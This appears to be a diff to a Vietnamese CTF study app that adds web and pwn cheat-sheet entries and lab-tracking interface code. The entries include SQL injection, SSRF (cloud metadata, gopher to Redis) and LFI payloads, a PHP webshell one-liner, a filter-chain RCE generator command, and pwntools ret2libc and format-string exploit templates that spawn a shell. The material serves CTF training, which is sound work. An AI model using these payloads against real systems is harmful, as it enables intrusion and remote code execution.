+      "SSRF: 127.0.0.1, localhost, [::1], 127.1, 2130706433.",
+      "SSRF: metadata 169.254.169.254; file://, gopher://; bypass redirect/@/#.",
+      "LFI: ../../etc/passwd; php://filter/convert.base64-encode/resource=index.php.",
+      "LFI: log poisoning, session file, /proc/self/environ, pearcmd, filter chain.",
+      "So sánh status/time/body để phát hiện blind."
+    ],
+    payloads: [
+      {
+        title: "SQLi",
+        code: C(
+          "admin' OR 1=1-- -",
+          "' UNION SELECT 1,2,3-- -",
+          "' AND SUBSTRING((SELECT flag FROM flag),1,1)='B'-- -",
+          "' AND SLEEP(5)-- -"
+        )
+      },
+      {
+        title: "SSRF",
+        code: C(
+          "http://127.0.0.1:80/",
+          "http://localhost/",
+          "http://[::1]/",
+          "http://169.254.169.254/latest/meta-data/",
+          "file:///etc/passwd",
+          "gopher://127.0.0.1:6379/_INFO"
+        )
+      },
+      {
+        title: "LFI / PHP wrappers",
+        code: C(
+          "../../../../etc/passwd",
+          "php://filter/convert.base64-encode/resource=index.php",
+          "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php",
+          "data://text/plain,<?php system($_GET['c']); ?>"
+        )
+      }
+    ],
+    commands: [
+      {
+        title: "SQLi tool",
+        code: "sqlmap -u 'http://TARGET/item?id=1' --batch --dbs"
+      },
+      {
+        title: "Blind SSRF / OAST",
+        code: "interactsh-client"
+      },
+      {
+        title: "Filter chain generator",
+        code: "python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'"
+      }
+    ],
+    gotchas: [
+      "SQLi: khác biệt quote/paren/comment giữa MySQL, PostgreSQL, MSSQL, SQLite.",
+      "SSRF: parser của server và URL parser của bạn có thể khác nhau.",
+      "LFI: open_basedir/disable_functions có thể chặn; thử filter chain.",
+      "Blind: đo thời gian/status/length thay vì chỉ nhìn body."
+    ],
+    links: [
+      { title: "PortSwigger SQLi", url: "https://portswigger.net/web-security/sql-injection" },
+      { title: "PortSwigger SSRF", url: "https://portswigger.net/web-security/ssrf" },
+      { title: "PayloadsAllTheThings — LFI", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" },
+      { title: "SSRF Bible", url: "https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf" }
+    ]
+  }
+);
+DATA.find(s => s.id === "pwn").items.push(
+  {
+    id: "pwn-decision",
+    title: "Pwn decision tree",
+    summary: "Checksec trước, rồi chọn hướng theo mitigation. Đừng viết exploit trước khi biết libc và offset.",
+    tags: ["triage", "checksec", "methodology"],
+    priority: "high",
+    tree: [
+      {
+        sign: "Có binary / remote service",
+        actions: [
+          "file, checksec, ldd, strings, readelf",
+          "Chạy thử local; xác định input/output",
+          "seccomp-tools dump",
+          "Xác định libc version; pwninit/patchelf"
+        ]
+      },
+      {
+        sign: "NX disabled",
+        actions: [
+          "Shellcode trên stack",
+          "Kiểm tra bad chars và vị trí buffer"
+        ]
+      },
+      {
+        sign: "Canary enabled",
+        actions: [
+          "Leak canary bằng format string/overread",
+          "Brute force nếu process fork",
+          "Giữ nguyên canary khi overwrite return address"
+        ]
+      },
+      {
+        sign: "PIE enabled",
+        actions: [
+          "Leak code pointer (fmt, puts, stack)",
+          "Partial overwrite 1-2 byte",
+          "Brute force 4 bit nếu cần"
+        ]
+      },
+      {
+        sign: "NX on, không có win()",
+        actions: [
+          "ret2libc: leak GOT puts/printf, return main",
+          "ROP/ret2syscall/ret2csu",
+          "Kiểm tra stack alignment"
+        ]
+      },
+      {
+        sign: "Có printf(buf)",
+        actions: [
+          "Tìm offset %p",
+          "Leak canary/libc/PIE/stack",
+          "Ghi GOT bằng %n/%hn",
+          "fmtstr_payload nếu đủ quyền"
+        ]
+      },
+      {
+        sign: "Có malloc/free, note app",
+        actions: [
+          "Xác định glibc version",
+          "UAF/double free",
+          "Leak heap/libc bằng unsorted bin",
+          "tcache poisoning; safe-linking",
+          "FSOP/hooks tùy glibc"
+        ]
+      },
+      {
+        sign: "Seccomp filter",
+        actions: [
+          "seccomp-tools dump",
+          "ORW shellcode: open/read/write",
+          "openat/execveat nếu execve bị chặn"
+        ]
+      }
+    ],
+    links: [
+      { title: "pwn.college", url: "https://pwn.college/" },
+      { title: "how2heap", url: "https://github.com/shellphish/how2heap" }
+    ]
+  },
+  {
+    id: "pwn-recon",
+    title: "Setup & recon",
+    summary: "Chuẩn bị môi trường đúng libc trước khi exploit. Sai libc/ld là mất 30 phút vô ích.",
+    tags: ["checksec", "libc", "pwntools"],
+    priority: "high",
+    signals: [
+      "Binary ELF/PE, có hoặc không source",
+      "Có remote host:port",
+      "Có file libc.so.6 hoặc ld",
+      "Có seccomp"
+    ],
+    checklist: [
+      "file, checksec, ldd, strings, readelf -h/-s.",
+      "objdump -d hoặc Ghidra/IDA xem main và hàm nguy hiểm.",
+      "seccomp-tools dump nếu có filter.",
+      "Chạy thử local; xác định input format.",
+      "Xác định libc version; dùng pwninit/patchelf nếu cần.",
+      "Viết template pwntools có local/remote ngay từ đầu."
+    ],
+    commands: [
+      {
+        title: "Recon nhanh",
+        code: C(
+          "file chall",
+          "checksec --file=chall",
+          "ldd chall",
+          "strings -a chall | head -50",
+          "readelf -h chall",
+          "seccomp-tools dump ./chall"
+        )
+      },
+      {
+        title: "Setup libc",
+        code: C(
+          "pwninit",
+          "patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall"
+        )
+      }
+    ],
+    gotchas: [
+      "Full RELRO: không ghi GOT được; dùng ret2dlresolve/FSOP.",
+      "Đúng libc nhưng sai ld cũng crash.",
+      "ASLR bật mặc định; leak trước khi tính địa chỉ.",
+      "Docker/remote có thể dùng libc khác binary local."
+    ],
+    links: [
+      { title: "pwntools docs", url: "https://docs.pwntools.com/" },
+      { title: "pwn.college", url: "https://pwn.college/" }
+    ]
+  },
+  {
+    id: "pwn-ret2libc",
+    title: "ret2libc / ROP",
+    summary: "NX on, không có win(): leak libc từ GOT, quay lại main, rồi gọi system('/bin/sh').",
+    tags: ["ret2libc", "rop", "pwntools"],
+    priority: "high",
+    signals: [
+      "NX enabled",
+      "Không có hàm win()",
+      "Có libc.so.6 hoặc leak được libc",
+      "Có buffer overflow"
+    ],
+    checklist: [
+      "Tìm offset bằng cyclic/cyclic_find.",
+      "Leak puts/printf GOT bằng ROP.",
+      "Return về main để exploit lần 2.",
+      "Tính libc base từ leak.",
+      "Tìm pop rdi; ret và ret alignment.",
+      "Gọi system('/bin/sh') hoặc one_gadget."
+    ],
+    payloads: [
+      {
+        title: "pwntools template",
+        code: C(
+          "from pwn import *",
+          "",
+          "elf = ELF('./chall')",
+          "libc = ELF('./libc.so.6')",
+          "context.binary = elf",
+          "p = process(elf.path)  # remote('HOST', PORT)",
+          "",
+          "offset = 40  # cyclic -l ...",
+          "pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]",
+          "ret = ROP(elf).find_gadget(['ret'])[0]",
+          "",
+          "payload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])",
+          "p.sendlineafter(b'> ', payload)",
+          "leak = u64(p.recvline().strip().ljust(8, b'\\\\x00'))",
+          "libc_base = leak - libc.sym['puts']",
+          "system = libc_base + libc.sym['system']",
+          "binsh = libc_base + next(libc.search(b'/bin/sh'))",
+          "",
+          "payload2 = flat(b'A'*offset, ret, pop_rdi, binsh, system)",
+          "p.sendlineafter(b'> ', payload2)",
+          "p.interactive()"
+        )
+      }
+    ],
+    commands: [
+      {
+        title: "Gadget / offset",
+        code: C(
+          "cyclic 200",
+          "ROPgadget --binary chall | grep 'pop rdi'",
+          "one_gadget libc.so.6"
+        )
+      }
+    ],
+    gotchas: [
+      "64-bit dùng pop rdi; ret, không phải pop rdi; pop rbp.",
+      "Stack alignment: thêm một ret trước system nếu crash.",
+      "puts dừng ở newline; dùng recvline và pad đúng 8 byte.",
+      "libc base phải trừ đúng symbol đã leak."
+    ],
+    links: [
+      { title: "Nightmare", url: "https://guyinatuxedo.github.io/" },
+      { title: "ROP Emporium", url: "https://ropemporium.com/" }
+    ]
+  },
+  {
+    id: "pwn-fmt",
+    title: "Format string",
+    summary: "printf(buf) là mỏ vàng: leak canary/libc/PIE/stack, rồi ghi GOT hoặc return address.",
+    tags: ["format-string", "gt", "pwntools"],
+    priority: "high",
+    signals: [
+      "printf(buf) hoặc sprintf(out, buf)",
+      "Input chứa %p/%s/%n",
+      "Có thể leak stack",
+      "GOT writable (không Full RELRO)"
+    ],
+    checklist: [
+      "Tìm offset bằng chuỗi %p.",
+      "Leak canary/libc/PIE/stack.",
+      "Đọc arbitrary memory bằng %s.",
+      "Ghi GOT bằng %n/%hn.",
+      "Nếu Full RELRO: leak rồi ret2dlresolve/ROP."
+    ],
+    payloads: [
+      {
+        title: "Leak offset",
+        code: "p.sendline(b'%p.' * 20)"
+      },
+      {
+        title: "Ghi GOT",
+        code: C(
+          "from pwn import *",
+          "elf = ELF('./chall')",
+          "p = process(elf.path)",
+          "offset = 6  # %p offset",
+          "payload = fmtstr_payload(offset, {elf.got['printf']: elf.plt['system']})",
+          "p.sendline(payload)"
+        )
+      }
+    ],
+    gotchas: [
+      "64-bit argument order: 6 thanh ghi trước, rồi stack.",
+      "%n đếm số ký tự đã in; dùng %hn để ghi 2 byte.",
+      "Buffering có thể làm leak chậm; flush bằng newline.",
+      "Full RELRO không ghi GOT được."
+    ],
+    links: [
+      { title: "Nightmare — format string", url: "https://guyinatuxedo.github.io/" },
+      { title: "pwntools fmtstr", url: "https://docs.pwntools.com/en/stable/fmtstr.html" }
+    ]
+  }
+);
+DATA.find(s => s.id === "ttv").items.push(
+  {
+    id: "ttv-patterns",
+    title: "TTV patterns 2025–2026",
+    summary: "Các dạng đã thấy ở TTV và BKSEC Training. Dùng để ưu tiên ôn, không phải đề dự đoán chính thức.",
+    tags: ["ttv", "patterns", "training"],
+    priority: "high",
+    signals: [
+      "Web: CSP injection + CSRF token leak + admin bot",
+      "Web: upload/phar/disable_functions",
+      "Web: JWT/API endpoint leak",
+      "Pwn: heap UAF/overflow; training có fmt/ret2libc"
+    ],
+    checklist: [
+      "Feedbin (TTV 2026): CSP injection qua cat_filter, script-src-elem, CSRF token, đổi password admin.",
+      "ezy pzy (TTV 2026): JWT/API endpoint leak; đọc JS/utils để tìm credential.",
+      "ba bước lên mây + revenge (TTV 2026): LFI/upload/phar; revenge bypass disable_functions.",
+      "Training web medium: Medium CSP, BKSecPad, Three Steps to Heaven, Double or Nothing, Gambling Coin 2.",
+      "Pwn TTV 2025: note app heap overflow + UAF, leak heap/libc/stack, RCE.",
+      "Training pwn: bof1–4 (canary/PIE), fmt1–2, integer, ret2libc, shellcode, Baby Heap.",
+      "Nếu gặp challenge lạ: quay lại decision tree, đừng đoán payload."
+    ],
+    links: [
+      { title: "kyrux29/CTF_WRITEUPS (TTV web)", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
+      { title: "NgoBaoDuyAnh/My-CTF-Journey (TTV web)", url: "https://github.com/NgoBaoDuyAnh/My-CTF-Journey" },
+      { title: "HackMD — BKSEC-TTV 2025 pwn", url: "https://hackmd.io/eW6x3UCuQWOD9vT5s5V_Vg" },
+      { title: "BKSEC Training", url: "https://training.bksec.vn" }
+    ]
+  }
+);
+
+DATA.find(s => s.id === "arsenal").items.push(
+  {
+    id: "arsenal",
+    title: "Arsenal & commands",
+    summary: "Lệnh và tool copy được ngay. Đây là bản tối giản; thêm dần sau TTV.",
+    tags: ["tools", "commands", "arsenal"],
+    priority: "medium",
+    commands: [
+      {
+        title: "Pwn",
+        code: C(
+          "checksec --file=chall",
+          "ROPgadget --binary chall | grep 'pop rdi'",
+          "one_gadget libc.so.6",
+          "seccomp-tools dump ./chall",
+          "pwninit",
+          "patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall"
+        )
+      },
+      {
+        title: "Web",
+        code: C(
+          "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fs 0",
+          "feroxbuster -u http://TARGET",
+          "jwt_tool TOKEN -T",
+          "phpggc Laravel/RCE1 system id -b",
+          "interactsh-client",
+          "python3 -m http.server 8000"
+        )
+      },
+      {
+        title: "Pwntools skeleton",
+        code: C(
+          "from pwn import *",
+          "",
+          "context.binary = elf = ELF('./chall')",
+          "libc = ELF('./libc.so.6')",
+          "context.log_level = 'info'",
+          "",
+          "def start():",
+          "    if args.REMOTE:",
+          "        return remote('HOST', 1337)",
+          "    return process(elf.path)",
+          "",
+          "p = start()",
+          "# gdb.attach(p, 'b *main')",
+          "p.interactive()"
+        )
+      }
+    ],
+    links: [
+      { title: "libc.rip", url: "https://libc.rip/" },
+      { title: "how2heap", url: "https://github.com/shellphish/how2heap" },
+      { title: "SecLists", url: "https://github.com/danielmiessler/SecLists" },
+      { title: "CyberChef", url: "https://gchq.github.io/CyberChef/" }
+    ]
+  }
+);
+const LABS_KEY = "ctf-playbook:labs:v1";
+const OPEN_LABS_KEY = "ctf-playbook:open-labs:v1";
+const ACTIVE_LAB_KEY = "ctf-playbook:active-lab:v1";
+const REF_CHECKS_KEY = "ctf-playbook:ref-checks:v1";
+
+const LAB_STEPS = [
+  "Recon: đọc đề, source, endpoint, version",
+  "Xác định dấu hiệu / attack surface",
+  "Chọn hướng + payload thử",
+  "Chạy exploit, ghi kết quả",
+  "Lấy flag / xác nhận",
+  "Viết writeup ngắn"
+];
+
+const STATUS = {
+  todo: { label: "Todo", cls: "todo" },
+  doing: { label: "Doing", cls: "doing" },
+  solved: { label: "Solved", cls: "solved" }
+};
+
+const ALL_ITEMS = [];
+const ITEM_MAP = {};
+const SECTION_MAP = {};
+DATA.forEach(section => {
+  SECTION_MAP[section.id] = section;
+  section.items.forEach(item => {
+    item.section = section.id;
+    ALL_ITEMS.push(item);
+    ITEM_MAP[item.id] = item;
+  });
+});
+
+function normalize(s) {
+  return String(s || "").toLowerCase().normalize("NFD")
+    .replace(/[̀-ͯ]/g, "").replace(/đ/g, "d");
+}
+
+ALL_ITEMS.forEach(item => {
+  const parts = [
+    item.title, item.summary, ...(item.tags || []),
+    ...(item.signals || []), ...(item.checklist || []),
+    ...(item.payloads || []).flatMap(p => [p.title, p.code]),
+    ...(item.commands || []).flatMap(c => [c.title, c.code]),
+    ...(item.gotchas || []),
+    ...(item.links || []).map(l => l.title),
+    ...(item.tree || []).flatMap(t => [t.sign, ...(t.actions || [])])
+  ];
+  item._search = normalize(parts.join(" \n "));
+});
+
+function loadJSON(key, fallback) {
+  try {
+    const v = JSON.parse(localStorage.getItem(key));
+    return v === null || v === undefined ? fallback : v;
+  } catch (e) { return fallback; }
+}
+function saveJSON(key, value) {
+  try { localStorage.setItem(key, JSON.stringify(value)); } catch (e) {}
+}
+
+let labs = loadJSON(LABS_KEY, []);
+if (!Array.isArray(labs)) labs = [];
+labs = labs.filter(l => l && l.id);
+labs.forEach(lab => {
+  if (!Array.isArray(lab.checklist) || lab.checklist.length !== LAB_STEPS.length) {
+    lab.checklist = LAB_STEPS.map((_, i) => Boolean(lab.checklist && lab.checklist[i]));
+  }
+  if (!STATUS[lab.status]) lab.status = "todo";
+  if (!lab.category) lab.category = "Web";
+  if (typeof lab.notes !== "string") lab.notes = "";
+  if (typeof lab.flag !== "string") lab.flag = "";
+  if (typeof lab.target !== "string") lab.target = "";
+});
+
+let openLabIds = loadJSON(OPEN_LABS_KEY, []);
+if (!Array.isArray(openLabIds)) openLabIds = [];
+openLabIds = openLabIds.filter(id => labs.some(l => l.id === id));
+let activeLabId = localStorage.getItem(ACTIVE_LAB_KEY) || null;
+if (!labs.some(l => l.id === activeLabId)) activeLabId = openLabIds[openLabIds.length - 1] || null;
+if (activeLabId && !openLabIds.includes(activeLabId)) openLabIds.push(activeLabId);
+
+let refChecks = loadJSON(REF_CHECKS_KEY, {});
+if (!refChecks || typeof refChecks !== "object" || Array.isArray(refChecks)) refChecks = {};
+let refItemId = null;
+let refTab = null;
+let codeStore = [];
+let searchResults = [];
+
+const $ = sel => document.querySelector(sel);
+const sidebarEl = $("#sidebar");
+const tabbarEl = $("#tabbar");
+const contentEl = $("#content");
+const searchEl = $("#search");
+const topProgressEl = $("#topProgress");
+const toastEl = $("#toast");
+
+function esc(s) {
+  return String(s == null ? "" : s).replace(/[&<>"']/g, c => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+  }[c]));
+}
+function inline(s) {
+  return esc(s).replace(/`([^`]+)`/g, "<code>$1</code>");
+}
+function showToast(msg) {
+  toastEl.textContent = msg;
+  toastEl.classList.add("show");
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => toastEl.classList.remove("show"), 1400);
+}
+async function copyText(text, btn) {
+  try { await navigator.clipboard.writeText(text); }
+  catch (e) {
+    const ta = document.createElement("textarea");
+    ta.value = text;
+    ta.style.position = "fixed";
+    ta.style.opacity = "0";
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand("copy"); } catch (e2) {}
+    ta.remove();
+  }
+  if (btn) {
+    const old = btn.textContent;
+    btn.textContent = "Copied";
+    btn.classList.add("ok");
+    setTimeout(() => { btn.textContent = old; btn.classList.remove("ok"); }, 1100);
+  }
+  showToast("Đã copy");
+}
+
+function saveLabs() { saveJSON(LABS_KEY, labs); }
+function saveOpen() { saveJSON(OPEN_LABS_KEY, openLabIds); }
+function saveActive() {
+  try {
+    if (activeLabId) localStorage.setItem(ACTIVE_LAB_KEY, activeLabId);
+    else localStorage.removeItem(ACTIVE_LAB_KEY);
+  } catch (e) {}
+}
+function saveRefChecks() { saveJSON(REF_CHECKS_KEY, refChecks); }
+
+function getLab(id) { return labs.find(l => l.id === id); }
+function labById(id) { return labs.find(l => l.id === id); }
+
+function newLab() {
+  const now = Date.now();
+  const lab = {
+    id: "lab-" + now,
+    title: "Lab " + (labs.length + 1),
+    category: "Web",
+    target: "",
+    status: "todo",
+    notes: "",
+    flag: "",
+    checklist: LAB_STEPS.map(() => false),
+    createdAt: now,
+    updatedAt: now
+  };
+  labs.push(lab);
+  openLabIds.push(lab.id);
+  activeLabId = lab.id;
+  saveLabs(); saveOpen(); saveActive();
+  closeReference();
+  renderAll();
+  setTimeout(() => {
+    const el = document.getElementById("labTitle");
+    if (el) { el.focus(); el.select(); }
+  }, 0);
+}
+
+function deleteLab(id) {
+  const lab = getLab(id);
+  if (!lab) return;
+  if (!confirm('Xoá lab "' + lab.title + '"? Không thể hoàn tác.')) return;
+  labs = labs.filter(l => l.id !== id);
+  openLabIds = openLabIds.filter(x => x !== id);
+  if (activeLabId === id) activeLabId = openLabIds[openLabIds.length - 1] || null;
+  saveLabs(); saveOpen(); saveActive();
+  renderAll();
+}
+
+function closeLabTab(id) {
+  openLabIds = openLabIds.filter(x => x !== id);
+  if (activeLabId === id) activeLabId = openLabIds[openLabIds.length - 1] || null;
+  saveOpen(); saveActive();
+  renderTabs(); renderContent();
+}
+
+function openLab(id) {
+  if (!getLab(id)) return;
+  if (!openLabIds.includes(id)) openLabIds.push(id);
+  activeLabId = id;
+  saveOpen(); saveActive();
+  closeReference();
+  renderTabs(); renderContent();
+}
+
+function showBoard() {
+  activeLabId = null;
+  saveActive();
+  closeReference();
+  renderTabs(); renderContent();
+}
+
+function updateLab(id, patch, opts) {
+  const lab = getLab(id);
+  if (!lab) return;
+  Object.assign(lab, patch);
+  lab.updatedAt = Date.now();
+  saveLabs();
+  if (opts && opts.tabs) renderTabs();
+  if (opts && opts.content) renderContent();
+  if (opts && opts.top) updateTopProgress();
+}
+
+function statusMeta(s) { return STATUS[s] || STATUS.todo; }
+function solvedCount() { return labs.filter(l => l.status === "solved").length; }
+
+function navItem(item) {
+  const btn = document.createElement("button");
+  btn.className = "nav-item" + (refItemId === item.id ? " active" : "");
+  btn.type = "button";
+  const total = item.checklist ? item.checklist.length : 0;
+  const done = item.checklist ? item.checklist.reduce((n, _, i) => n + (refChecks[item.id + ":" + i] ? 1 : 0), 0) : 0;
+  btn.innerHTML =
+    '<span class="nav-title"><span class="dot ' + esc(item.priority || "low") + '"></span>' +
+    "<span>" + esc(item.title) + "</span></span>" +
+    (total ? '<span class="nav-progress">' + done + "/" + total + "</span>" : "");
+  btn.addEventListener("click", () => openReference(item.id));
+  return btn;
+}
+
+function sectionTitle(text, count) {
+  const div = document.createElement("div");
+  div.className = "section-title";
+  div.innerHTML = "<span>" + esc(text) + "</span>" +
+    (count !== undefined ? '<span class="count">' + count + "</span>" : "");
+  return div;
+}
+
+function filteredItems() {
+  const q = normalize(searchEl.value.trim());
+  if (!q) return [];
+  const terms = q.split(/\s+/).filter(Boolean);
+  return ALL_ITEMS.filter(item => terms.every(t => item._search.includes(t)));
+}
+
+function renderSidebar() {
+  sidebarEl.innerHTML = "";
+  const q = searchEl.value.trim();
+  if (q) {
+    searchResults = filteredItems();
+    sidebarEl.appendChild(sectionTitle("Kết quả", searchResults.length));
+    if (!searchResults.length) {
+      const empty = document.createElement("div");
+      empty.className = "nav-empty";
+      empty.textContent = "Không tìm thấy reference.";
+      sidebarEl.appendChild(empty);
+    } else {
+      searchResults.forEach(item => sidebarEl.appendChild(navItem(item)));
+    }
+  } else {
+    DATA.forEach(section => {
+      sidebarEl.appendChild(sectionTitle(section.title, section.items.length));
+      section.items.forEach(item => sidebarEl.appendChild(navItem(item)));
+    });
+  }
+
+  const footer = document.createElement("div");
+  footer.className = "sidebar-footer";
+  const newBtn = document.createElement("button");
+  newBtn.className = "btn btn-primary";
+  newBtn.textContent = "＋ New lab";
+  newBtn.addEventListener("click", newLab);
+  const boardBtn = document.createElement("button");
+  boardBtn.className = "btn";
+  boardBtn.textContent = "Lab board";
+  boardBtn.addEventListener("click", showBoard);
+  const resetBtn = document.createElement("button");
+  resetBtn.className = "btn";
+  resetBtn.textContent = "Reset refs";
+  resetBtn.addEventListener("click", () => {
+    if (!confirm("Xoá trạng thái checklist reference?")) return;
+    refChecks = {};
+    saveRefChecks();
+    renderSidebar();
+    if (refItemId) renderDrawer();
+  });
+  footer.appendChild(newBtn);
+  footer.appendChild(boardBtn);
+  footer.appendChild(resetBtn);
+  sidebarEl.appendChild(footer);
+}
+
+function tabStatusDot(lab) {
+  return '<span class="status-dot ' + statusMeta(lab.status).cls + '"></span>';
+}
+
+function renderTabs() {
+  tabbarEl.innerHTML = "";
+  openLabIds.forEach(id => {
+    const lab = getLab(id);
+    if (!lab) return;
+    const wrap = document.createElement("div");
+    wrap.className = "tab" + (activeLabId === id ? " active" : "");
+    const label = document.createElement("button");
+    label.className = "tab-label";
+    label.type = "button";
+    label.innerHTML = tabStatusDot(lab) + "<span>" + esc(lab.title) + "</span>";
+    label.title = lab.title;
+    label.addEventListener("click", () => openLab(id));
+    const close = document.createElement("button");
+    close.className = "tab-close";
+    close.type = "button";
+    close.textContent = "×";
+    close.title = "Đóng tab (lab vẫn còn trong board)";
+    close.addEventListener("click", e => { e.stopPropagation(); closeLabTab(id); });
+    wrap.appendChild(label);
+    wrap.appendChild(close);
+    tabbarEl.appendChild(wrap);
+  });
+  const add = document.createElement("button");
+  add.className = "tab-add";
+  add.type = "button";
+  add.textContent = "＋";
+  add.title = "Lab mới";
+  add.addEventListener("click", newLab);
+  tabbarEl.appendChild(add);
+  if (!openLabIds.length) {
+    const empty = document.createElement("span");
+    empty.className = "tab-empty";
+    empty.textContent = "Chưa mở lab nào";
+    tabbarEl.appendChild(empty);
+  }
+}
+
+function updateTopProgress() {
+  topProgressEl.textContent = labs.length + " labs · " + solvedCount() + " solved";
+}
+
+function formatTime(ts) {
+  if (!ts) return "";
+  try {
+    return new Date(ts).toLocaleString("vi-VN", {
+      hour: "2-digit", minute: "2-digit", day: "2-digit", month: "2-digit"
+    });
+  } catch (e) { return ""; }
+}
+
+function renderBoard() {
+  let html = '<div class="welcome">' +
+    '<div class="kicker">CTF Playbook / Web + Pwn</div>' +
+    '<h1>Labs</h1>' +
+    '<p class="summary">Mỗi tab là một lab. Mở nhiều lab cùng lúc, ghi target/notes/flag, và mở reference ở sidebar khi cần.</p>' +
+    '<div class="board-actions"><button class="btn btn-primary" id="newLabTop">＋ New lab</button>' +
+    '<button class="btn" id="openFirstRef">Mở reference</button></div>' +
+    '<div class="callout">20–30 phút/bài rồi rotate · easy points trước · ghi note · không dùng AI.</div>' +
+    '<div class="lab-list">';
+
+  if (!labs.length) {
+    html += '<div class="empty-state">Chưa có lab nào. Tạo lab đầu tiên để bắt đầu.</div>';
+  } else {
+    labs.slice().sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0)).forEach(lab => {
+      const st = statusMeta(lab.status);
+      html += '<button class="lab-row" type="button" data-lab="' + esc(lab.id) + '">' +
+        '<span class="status-dot ' + st.cls + '"></span>' +
+        '<span class="lab-row-main"><strong>' + esc(lab.title) + "</strong>" +
+        '<small>' + esc(lab.category) + (lab.target ? " · " + esc(lab.target) : "") + "</small></span>" +
+        '<span class="lab-row-meta">' + esc(st.label) + " · " + esc(formatTime(lab.updatedAt)) + "</span>" +
+        "</button>";
+    });
+  }
+  html += "</div>";
+  html += '<div class="board-help"><h2>Cách dùng</h2><ul>' +
+    "<li>Tạo tab lab bằng nút <code>＋</code> trên tab bar hoặc <code>New lab</code>.</li>" +
+    "<li>Click reference ở sidebar để mở drawer bên phải; lab đang làm vẫn giữ nguyên.</li>" +
+    "<li>Mọi thứ lưu trong <code>localStorage</code> của file này.</li>" +
+    "</ul></div></div>";
+  contentEl.innerHTML = html;
+
+  const newTop = document.getElementById("newLabTop");
+  if (newTop) newTop.addEventListener("click", newLab);
+  const openRef = document.getElementById("openFirstRef");
+  if (openRef) openRef.addEventListener("click", () => openReference("web-decision"));
+  contentEl.querySelectorAll("[data-lab]").forEach(btn => {
+    btn.addEventListener("click", () => openLab(btn.dataset.lab));
+  });
+}
+
+function renderLab(lab) {
+  const st = statusMeta(lab.status);
+  const done = lab.checklist.filter(Boolean).length;
+  let html = '<div class="crumb">Lab / ' + esc(lab.category) + "</div>";
+  html += '<input id="labTitle" class="lab-title" value="' + esc(lab.title) + '" placeholder="Tên lab..." spellcheck="false">';
+  html += '<div class="lab-meta">' +
+    '<label class="field"><span>Category</span><select id="labCategory">' +
+    ["Web", "Pwn", "Other"].map(c => '<option value="' + c + '"' + (lab.category === c ? " selected" : "") + ">" + c + "</option>").join("") +
+    "</select></label>" +
+    '<label class="field"><span>Status</span><select id="labStatus">' +
+    Object.keys(STATUS).map(k => '<option value="' + k + '"' + (lab.status === k ? " selected" : "") + ">" + STATUS[k].label + "</option>").join("") +
+    "</select></label>" +
+    '<label class="field field-wide"><span>Target</span><input id="labTarget" value="' + esc(lab.target) + '" placeholder="http://target:port hoặc host:port" spellcheck="false"></label>' +
+    '<span class="lab-updated">sửa ' + esc(formatTime(lab.updatedAt)) + "</span>" +
+    "</div>";
+
+  html += '<div class="lab-grid"><div class="lab-main">';
+  html += '<section class="block"><div class="block-head"><h2>Notes</h2><span class="block-meta">tự lưu</span></div>' +
+    '<textarea id="labNotes" class="lab-notes" placeholder="Manh mối, hypothesis, payload đã thử, kết quả...">' +
+    esc(lab.notes) + "</textarea></section>";
+  html += '<section class="block"><div class="block-head"><h2>Checklist</h2><span class="block-meta">' +
+    done + "/" + LAB_STEPS.length + '</span></div><div id="labChecks">' +
+    LAB_STEPS.map((step, i) => '<label class="check"><input type="checkbox" data-step="' + i + '"' +
+      (lab.checklist[i] ? " checked" : "") + "><span>" + inline(step) + "</span></label>").join("") +
+    "</div></section>";
+  html += "</div>";
+
+  html += '<aside class="lab-rail">';
+  html += '<section class="rail-block"><h2>Flag</h2><input id="labFlag" class="field-input" value="' +
+    esc(lab.flag) + '" placeholder="flag{...}" spellcheck="false">' +
+    '<button class="btn btn-primary" id="markSolved">Mark solved</button></section>';
+  html += '<section class="rail-block"><h2>Reference nhanh</h2><div class="ref-links">' +
+    ["web-xss", "web-upload", "web-jwt", "web-injection", "pwn-ret2libc", "pwn-fmt"]
+      .filter(id => ITEM_MAP[id])
+      .map(id => '<button class="ref-link" type="button" data-ref="' + id + '">' + esc(ITEM_MAP[id].title) + "</button>")
+      .join("") + "</div></section>";
+  html += '<section class="rail-block"><h2>Lab</h2><div class="rail-actions">' +
+    '<button class="btn" id="boardFromLab">Lab board</button>' +
+    '<button class="btn btn-danger" id="deleteLab">Delete lab</button></div></section>';
+  html += "</aside></div>";
+
+  contentEl.innerHTML = html;
+
+  const titleEl = document.getElementById("labTitle");
+  titleEl.addEventListener("input", () => {
+    updateLab(lab.id, { title: titleEl.value }, { tabs: true });
+  });
+  const categoryEl = document.getElementById("labCategory");
+  categoryEl.addEventListener("change", () => {
+    updateLab(lab.id, { category: categoryEl.value }, { content: true });
+  });
+  const statusEl = document.getElementById("labStatus");
+  statusEl.addEventListener("change", () => {
+    updateLab(lab.id, { status: statusEl.value }, { content: true, tabs: true, top: true });
+  });
+  const targetEl = document.getElementById("labTarget");
+  targetEl.addEventListener("input", () => {
+    updateLab(lab.id, { target: targetEl.value });
+  });
+  const notesEl = document.getElementById("labNotes");
+  let notesTimer = null;
+  notesEl.addEventListener("input", () => {
+    clearTimeout(notesTimer);
+    notesTimer = setTimeout(() => updateLab(lab.id, { notes: notesEl.value }), 120);
+  });
+  const flagEl = document.getElementById("labFlag");
+  flagEl.addEventListener("input", () => {
+    updateLab(lab.id, { flag: flagEl.value });
+  });
+  document.getElementById("markSolved").addEventListener("click", () => {
+    updateLab(lab.id, { status: "solved" }, { content: true, tabs: true, top: true });
+    showToast("Đã đánh dấu solved");
+  });
+  document.getElementById("boardFromLab").addEventListener("click", showBoard);
